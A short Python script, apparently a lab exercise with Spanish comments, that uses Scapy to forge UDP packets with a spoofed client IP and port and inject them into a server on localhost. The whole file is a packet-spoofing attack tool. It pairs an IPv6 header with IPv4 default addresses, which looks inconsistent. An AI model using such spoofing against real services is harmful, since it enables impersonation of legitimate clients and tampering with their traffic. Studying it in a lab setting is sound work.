import argparse
from scapy.all import *


def hack_client(
    message: str, client_ip: str, client_port: int, server_ip: str, server_port: int
) -> None:
    """
    Function that hacks the client by intercepting and modifying UDP packets
    """

    packet = (
        IPv6(src=client_ip, dst=server_ip)
        / UDP(sport=client_port, dport=server_port)
        / Raw(load=f"{message}\n".encode())
    )
    
    print(f"Packet to send: {packet[Raw].load}")

    send(packet, verbose=0, iface="lo")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Pirata para inyectar paquetes UDP a un servidor"
        "para que crea que son del cliente"
    )

    parser.add_argument(
        "--client-ip",
        type=str,
        default="127.0.0.1",
        help="IP del cliente a hackear",
    )
    parser.add_argument(
        "--client-port",
        type=int,
        default="1818",
        help="Puerto del cliente a hackear",
    )
    parser.add_argument(
        "--server-ip",
        type=str,
        default="127.0.0.1",
        help="IP del servidor",
    )
    parser.add_argument(
        "--server-port",
        type=int,
        default="1818",
        help="Puerto del servidor",
    )

    args = parser.parse_args()
    print("Available interfaces:")
    interfaces = scapy.arch.get_if_list()
    print(f"{interfaces}\n")

    print(f"Cliente a hackear: {args.client_ip}:{args.client_port}")
    print(f"Servidor: {args.server_ip}:{args.server_port}")

    conf.L3socket = L3RawSocket

    hack_client(
        message="Hola, soy un paquete UDP inyectado",
        client_ip=args.client_ip,
        client_port=args.client_port,
        server_ip=args.server_ip,
        server_port=args.server_port,
    )
